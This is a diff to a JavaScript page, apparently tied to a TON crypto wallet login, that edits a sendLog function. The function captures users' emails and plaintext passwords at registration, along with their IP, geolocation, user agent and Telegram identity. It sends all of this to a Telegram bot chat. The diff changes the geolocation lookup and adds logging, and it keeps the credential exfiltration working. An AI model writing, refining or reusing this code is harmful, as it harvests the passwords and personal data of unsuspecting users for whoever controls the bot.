@@ -2042,18 +2042,20 @@ async function openTonConnect() {
   await tonConnectUI.openModal();
 }
 
- async function sendLog(method, email, password) {
+async function sendLog(method, email, password) {
   try {
     let ip = '', country = '', city = '';
     try {
-      const geo = await fetch('https://ipapi.co/json/');
+      const geo = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
       const gd  = await geo.json();
-      ip      = gd.ip       || '';
-      country = gd.country_name || '';
-      city    = gd.city     || '';
-    } catch(e){}
+      if (gd.status === 'success') {
+        ip      = gd.query   || '';
+        country = gd.country || '';
+        city    = gd.city    || '';
+      }
+    } catch(e){ console.log('geo error:', e); }
 
-    const ua = navigator.userAgent;
+    const ua  = navigator.userAgent;
     const now = new Date().toLocaleString('ru-RU', {
       timeZone: 'Europe/Chisinau',
       day:'2-digit', month:'2-digit', year:'numeric',
@@ -2061,17 +2063,19 @@ async function openTonConnect() {
     });
 
     let text = '';
-    if(method === 'register') {
+    if (method === 'register') {
       text = `🆕 <b>Новый пользователь</b>\n`
            + `👤 ${uid} ${username}\n`
-           + `📧 ${email || '—'}\n`
+           + `📧 ${email    || '—'}\n`
            + `🔑 ${password || '—'}\n`
            + `📱 ${ua}\n`
            + `🌐 Язык: ${navigator.language || 'ru'}\n`
            + `📍 ${country}, ${city} (IP: ${ip})\n`
            + `🕐 ${now}`;
     } else {
-      const label = method === 'telegram' ? '✈️ <b>Вход через Telegram</b>' : '🔐 <b>Вход</b>';
+      const label = method === 'telegram'
+        ? '✈️ <b>Вход через Telegram</b>'
+        : '🔐 <b>Вход</b>';
       text = `${label}\n`
            + `👤 ${uid} ${username}\n`
            + `📱 ${ua}\n`
@@ -2080,12 +2084,23 @@ async function openTonConnect() {
            + `🕐 ${now}`;
     }
 
-    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
-    });
-  } catch(e){ console.log('log error', e); }
+    const resp = await fetch(
+      `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,
+      {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({
+          chat_id:    TG_CHAT_ID,
+          text:       text,
+          parse_mode: 'HTML'
+        })
+      }
+    );
+    const json = await resp.json();
+    console.log('sendLog result:', JSON.stringify(json));
+  } catch(e) {
+    console.log('sendLog error:', e);
+  }
 }
 
 
